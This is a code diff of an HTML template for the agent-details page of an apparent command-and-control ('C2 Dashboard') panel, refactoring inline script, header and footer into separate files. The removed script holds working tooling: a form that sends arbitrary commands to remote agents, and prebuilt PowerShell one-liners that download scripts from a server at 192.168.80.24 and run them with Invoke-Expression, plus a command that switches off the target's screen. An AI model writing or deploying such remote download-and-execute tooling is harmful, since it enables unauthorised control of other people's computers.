@@ -5,111 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{{ agent.hostname }} - Agent Details</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        function toggleSection(sectionId, arrowId) {
-            const section = document.getElementById(sectionId);
-            const arrow = document.getElementById(arrowId);
-            section.classList.toggle('hidden');
-            arrow.style.transform = section.classList.contains('hidden') ? 'rotate(0deg)' : 'rotate(180deg)';
-        }
-
-        // Function to handle form submission
-        function submitCommandForm(event) {
-            event.preventDefault(); // Prevent default form submission
-
-            const commandInput = document.getElementById('commandInput');
-            const agentIdInput = document.getElementById('agentId');
-            const command = commandInput.value.trim();
-            const agentId = agentIdInput.value;
-
-            if (command) {
-                fetch('/send_command', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ agent_id: agentId, command: command })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data) {
-                        // Handle success (show confirmation, clear form, etc.)
-                        alert('Command sent successfully!');
-                        commandInput.value = ''; // Clear the input field
-                    } else {
-                        // Handle failure
-                        alert('Failed to send command. Please try again.');
-                    }
-                })
-                .catch(error => {
-                    alert('Error: ' + error.message);
-                });
-            }
-        }
-
-    // Function to populate the command input field
-    function populateCommand(script) {
-        const commandInput = document.getElementById('commandInput');
-        commandInput.value = script;
-    }
-
-    // Function to dynamically create prebuilt script buttons
-    function createPrebuiltScriptButtons() {
-        const serverURL = "http://192.168.80.24:5000"
-        const scripts = [
-            {
-                name: 'Test Script',
-                command: `Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "${serverURL}/static/scripts/script.ps1").Content) )`
-            },
-            {
-                name: 'Wallpaper Script',
-                command: `Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "${serverURL}/static/scripts/wallpaper.ps1").Content) )`
-            },
-            {
-                name: 'Talk',
-                command: `Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "${serverURL}/static/scripts/talk.ps1").Content) )`
-            },
-            {
-                name: 'Monkey',
-                command: `Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "${serverURL}/static/scripts/monkey.ps1").Content) )`
-            },
-            {
-                name: 'Turn off screen',
-                command: "(Add-Type '[DllImport(\"user32.dll\")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)"
-            }
-            // Add more scripts here if needed
-        ];
-
-        const prebuiltScriptsContainer = document.getElementById('prebuiltScripts');
-
-        scripts.forEach(script => {
-            const button = document.createElement('button');
-            button.textContent = script.name;
-            button.className = 'px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-semibold';
-            button.onclick = () => populateCommand(script.command);
-            prebuiltScriptsContainer.appendChild(button);
-        });
-    }
-
-    // Initialize prebuilt script buttons on page load
-    document.addEventListener('DOMContentLoaded', createPrebuiltScriptButtons);
-    </script>
+    
+    <!-- Include the external JavaScript file -->
+    <script src="/static/js/agentDetails.js"></script>
 </head>
 <body class="bg-gray-900 text-gray-100">
 
     <div class="min-h-screen flex flex-col">
-        <!-- Header -->
-        <header class="bg-gray-800 p-4 shadow-md">
-            <div class="container mx-auto flex justify-between items-center">
-                <h1 class="text-3xl font-bold text-white">C2 Dashboard</h1>
-                <nav>
-                    <a href="/" class="text-lg text-white hover:text-gray-400">Home</a>
-                    <a href="#" class="ml-4 text-lg text-white hover:text-gray-400">Settings</a>
-                    <a href="{{ url_for('logout') }}" class="ml-4 text-lg text-white hover:text-gray-400">Logout</a>
-                </nav>
-            </div>
-        </header>
-
+        {% include 'navbar.html' %}
         <!-- Main Content -->
         <main class="flex-grow container mx-auto p-6">
             <div class="bg-gray-700 p-6 rounded-lg shadow-lg">
@@ -227,10 +130,7 @@
             </div>
         </main>
 
-        <!-- Footer -->
-        <footer class="bg-gray-800 p-4 text-center text-white">
-            <p>&copy; 2024 C2 Command Center | All rights reserved.</p>
-        </footer>
+        {% include 'footer.html' %}
     </div>
 
 </body>
